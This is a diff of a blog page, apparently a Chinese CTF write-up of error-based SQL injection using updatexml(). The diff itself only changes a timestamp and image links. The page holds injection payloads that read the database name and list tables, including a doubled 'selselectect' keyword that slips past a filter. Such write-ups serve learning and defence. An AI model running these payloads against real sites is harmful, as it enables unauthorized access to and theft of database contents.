@@ -249,7 +249,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-03-15 00:35:30 / Modified: 13:24:33" itemprop="dateCreated datePublished" datetime="2022-03-15T00:35:30+08:00">2022-03-15</time>
+              <time title="Created: 2022-03-15 00:35:30 / Modified: 13:30:28" itemprop="dateCreated datePublished" datetime="2022-03-15T00:35:30+08:00">2022-03-15</time>
             </span>
 
           
@@ -266,13 +266,14 @@
           <h1 id="思维小计"><a href="#思维小计" class="headerlink" title="思维小计"></a>思维小计</h1><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
 <p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
 <h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
-<p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错<br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/1.png" alt="image-1.png"></p>
-<p>3.order by 4会报错，确定只有三列，这是一个报错注入<br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/2.png" alt="image-2.png"></p>
+<p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
+<p><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/1.png?raw=true" alt="1.png"></p>
+<p>3.order by 4会报错，确定只有三列，这是一个报错注入<br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/2.png?raw=true" alt="2.png"></p>
 <p>4.用updatexml函数进行报错返回值</p>
-<p><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/3.png" alt="image-3.png"></p>
-<p>构建语句发现只返回了一个~<br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/4.png" alt="image-4.png"></p>
-<p>发现中间这个值才会被返回<br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/5.png" alt="image-5.png"></p>
-<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code><br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/6.png" alt="image-6.png"></p>
+<p><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/3.png?raw=true" alt="3.png"></p>
+<p>构建语句发现只返回了一个~<br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/4.png?raw=true" alt="4.png"></p>
+<p>发现中间这个值才会被返回<br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/5.png?raw=true" alt="5.png"></p>
+<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code><br><img src="https://github.com/UknowJJ/jjhome.github.io/blob/master/PicGo/6.png?raw=true" alt="6.png"></p>
 <p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
 <p>构造语句</p>
 <p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
